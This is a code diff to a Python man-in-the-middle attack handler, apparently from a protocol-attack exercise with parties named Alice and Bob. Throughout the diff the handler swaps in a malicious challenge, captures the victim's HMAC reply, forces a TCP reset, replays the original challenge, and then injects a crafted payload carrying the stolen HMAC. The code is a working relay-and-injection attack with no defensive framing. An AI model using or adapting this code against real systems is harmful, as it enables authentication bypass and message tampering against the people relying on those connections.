@@ -64,6 +64,30 @@ class MitmAttackHandler:
             if self.attack_log:
                 logging.error(f"[MITM] Error setting SO_LINGER: {e}")
 
+    def force_tcp_rst_connection(self, writer):
+        """Force a TCP RST by closing the connection abruptly"""
+        try:
+            if self.attack_log:
+                logging.info(f"[MITM] Forcing TCP RST by closing connection abruptly")
+            
+            # Get the underlying socket
+            sock = writer.get_extra_info('socket')
+            if sock:
+                # Set SO_LINGER to 0 to force RST
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
+            
+            # Close the writer immediately without waiting
+            writer.close()
+            
+        except Exception as e:
+            if self.attack_log:
+                logging.error(f"[MITM] Error forcing TCP RST: {e}")
+            # Fallback: just close normally
+            try:
+                writer.close()
+            except:
+                pass
+
     def hex_dump(self, data, max_len=100):
         """Create a hex dump of data for debugging"""
         if isinstance(data, str):
@@ -116,6 +140,7 @@ class MitmAttackHandler:
                     logging.info(f"[MITM] *** CHALLENGE DETECTED on connection #{self.global_state.state['connection_count']} ***")
                     logging.info(f"[MITM] Challenge content: {raw_msg}")
                     logging.info(f"[MITM] Original data length: {len(original_data)} bytes")
+                
                 # Instead of forwarding Bob's challenge, send our own malicious challenge
                 malicious_bytes = b''
                 if self.attack_payload_hex:
@@ -134,6 +159,8 @@ class MitmAttackHandler:
                 else:
                     if self.attack_log:
                         logging.warning("[MITM] No malicious payload configured, sending empty payload")
+                
+                # Send the malicious challenge to Alice
                 writer.write(malicious_bytes)
                 await writer.drain()
                 if self.attack_log:
@@ -141,7 +168,9 @@ class MitmAttackHandler:
                 return False
                 
         # Detect HMAC from client (Alice) - this should be the response to our malicious challenge
-        elif self.global_state.state['active'] and self.global_state.state['phase'] == 'waiting_hmac' and isinstance(raw_msg, (bytes, str)):
+        elif (self.global_state.state['active'] and 
+              self.global_state.state['phase'] == 'waiting_hmac' and 
+              isinstance(raw_msg, (bytes, str))):
             # Check if this looks like an HMAC response (not a challenge or welcome)
             if isinstance(raw_msg, str) and not raw_msg.startswith('#CHALLENGE#') and not raw_msg.startswith('#WELCOME#'):
                 self.global_state.state['stored_hmac'] = original_data
@@ -151,34 +180,15 @@ class MitmAttackHandler:
                     logging.info(f"[MITM] HMAC content: {str(raw_msg)[:100]}")
                     logging.info(f"[MITM] HMAC data length: {len(original_data)} bytes")
                     logging.info(f"[MITM] Forcing TCP RST.")
-                # Force TCP RST instead of graceful close
-                self.force_tcp_rst(writer)
-                writer.close()
-                await writer.wait_closed()
-                return False
                 
-        # Special handling for alice_to_bob direction to capture HMAC responses
-        elif (self.direction_name == 'alice_to_bob' and 
-              self.global_state.state['active'] and 
-              self.global_state.state['phase'] == 'waiting_hmac' and 
-              isinstance(raw_msg, (bytes, str))):
-            # In alice_to_bob direction, we're looking for Alice's response to our malicious challenge
-            if isinstance(raw_msg, str) and not raw_msg.startswith('#CHALLENGE#') and not raw_msg.startswith('#WELCOME#'):
-                self.global_state.state['stored_hmac'] = original_data
-                self.global_state.state['phase'] = 'waiting_reconnect'
-                if self.attack_log:
-                    logging.info(f"[MITM] *** HMAC CAPTURED in alice_to_bob direction ***")
-                    logging.info(f"[MITM] HMAC content: {str(raw_msg)[:100]}")
-                    logging.info(f"[MITM] HMAC data length: {len(original_data)} bytes")
-                    logging.info(f"[MITM] Forcing TCP RST.")
-                # Force TCP RST instead of graceful close
-                self.force_tcp_rst(writer)
-                writer.close()
-                await writer.wait_closed()
-                return False
-            
+                # Signal that we need to reset the connection
+                # Return a special value to indicate RST needed
+                return "RST_CONNECTION"
+                
         # After reconnect, replay original challenge
-        elif self.global_state.state['active'] and self.global_state.state['phase'] == 'waiting_reconnect' and self.global_state.state['original_challenge']:
+        elif (self.global_state.state['active'] and 
+              self.global_state.state['phase'] == 'waiting_reconnect' and 
+              self.global_state.state['original_challenge']):
             if self.attack_log:
                 logging.info(f"[MITM] *** Replaying original challenge after reconnect ***")
             writer.write(self.global_state.state['original_challenge'])
@@ -188,7 +198,7 @@ class MitmAttackHandler:
                 logging.info(f"[MITM] Replayed original challenge to client after reconnect.")
             return False
             
-        # After handshake, inject malicious payload
+        # After handshake, inject malicious payload with captured HMAC
         elif self.global_state.state['active'] and self.global_state.state['phase'] == 'waiting_welcome':
             welcome_detected = False
             if isinstance(raw_msg, str) and raw_msg.startswith('#WELCOME#'):
@@ -202,11 +212,27 @@ class MitmAttackHandler:
             if welcome_detected:
                 if not self.global_state.state['injected'] and self.global_state.state['stored_hmac']:
                     if self.attack_log:
-                        logging.info(f"[MITM] *** Injecting stored HMAC and malicious payload after handshake ***")
-                    writer.write(self.global_state.state['stored_hmac'])
+                        logging.info(f"[MITM] *** Injecting malicious payload with captured HMAC after successful authentication ***")
+                    
+                    # Craft the malicious package: malicious payload + captured HMAC
+                    malicious_package = b''
+                    if self.attack_payload_hex:
+                        try:
+                            hex_str = self.attack_payload_hex.strip()
+                            if len(hex_str) % 2 != 0:
+                                hex_str = hex_str + '0'
+                            malicious_payload = binascii.unhexlify(hex_str)
+                            malicious_package = malicious_payload + self.global_state.state['stored_hmac']
+                        except Exception as e:
+                            logging.error(f"[MITM] Error crafting malicious package: {e}")
+                            malicious_package = self.global_state.state['stored_hmac']
+                    else:
+                        malicious_package = self.global_state.state['stored_hmac']
+                    
+                    writer.write(malicious_package)
                     await writer.drain()
                     if self.attack_log:
-                        logging.info(f"[MITM] Injected stored HMAC and malicious payload after handshake.")
+                        logging.info(f"[MITM] Injected malicious package with captured HMAC after successful authentication.")
                     self.global_state.state['injected'] = True
                 return True
             
